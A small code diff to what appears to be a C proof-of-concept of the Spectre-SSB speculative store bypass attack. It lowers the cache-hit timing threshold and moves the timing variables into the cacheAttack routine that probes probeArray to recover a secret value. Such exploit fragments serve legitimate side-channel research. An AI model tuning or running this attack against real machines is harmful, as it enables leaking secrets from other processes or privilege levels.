@@ -25,7 +25,7 @@
 // Note: smaller TRAIN_TIMES values increase misses or even cause failure, while larger ones unnecessarily take longer time.
 #define ATTACK_ROUNDS 9 // used to be 3, 8, 20, originally 40 Times to attack the same index. Ideal to have larger ATTACK_ROUNDS (takes more time but statistically better).
 // For most processors with simple MDP(Memory Dependence Prediction), theoretically 1 will be enough for a successful Spectre-SSB attack.
-#define CACHE_HIT_THRESHOLD 39 // 37-43 will see changes. Interval smaller than CACHE_HIT_THRESHOLD will be deemed as "cache hit". Ideal to have lower CACHE_HIT_THRESHOLD (higher accuracy).
+#define CACHE_HIT_THRESHOLD 36 // 37-43 will see changes. Interval smaller than CACHE_HIT_THRESHOLD will be deemed as "cache hit". Ideal to have lower CACHE_HIT_THRESHOLD (higher accuracy).
 // To keep results accurate, the larger TRAIN_TIMES and ATTACK_ROUNDS you have, the smaller CACHE_HIT_THRESHOLD shoud be.
 
 /* <<<<<< Mostly used parameters for debugging are listed above. <<<<<< */
@@ -94,7 +94,7 @@ uint8_t probeArray[ARRAY_SIZE_FACTOR * ARRAY_STRIDE];
 #define MIXER_B 1 // Arbitrary as long as larger than 0.
 
 	uint32_t mixed_i;
-	uint32_t start, diff;
+//	uint32_t start, diff;
 	uint32_t dummy;
 
 	// Get the highest and second highest hit values in results().
@@ -106,7 +106,7 @@ uint8_t probeArray[ARRAY_SIZE_FACTOR * ARRAY_STRIDE];
 
 void cacheAttack(){
 
-//			register uint32_t start, diff; // Use register variables (can only be local) to reduce access time.
+			register uint32_t start, diff; // Use register variables (can only be local) to reduce access time.
 			// Read out probeArray and see the hit secret value.
 			/* Time reads. Order is slightly mixed up to prevent stride prediction (prefetching). */
 			for (int i = 0; i < ARRAY_SIZE_FACTOR; i++) {
